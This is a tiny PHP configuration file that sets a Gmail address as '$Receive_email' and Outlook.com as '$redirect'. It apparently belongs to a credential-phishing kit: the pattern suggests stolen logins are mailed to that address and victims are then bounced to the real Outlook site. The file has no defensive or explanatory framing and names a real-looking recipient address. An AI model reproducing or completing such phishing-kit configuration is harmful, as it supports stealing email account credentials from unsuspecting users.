<?php 
$Receive_email="Jakefurberxc@gmail.com";
$redirect="https://www.Outlook.com/";
?>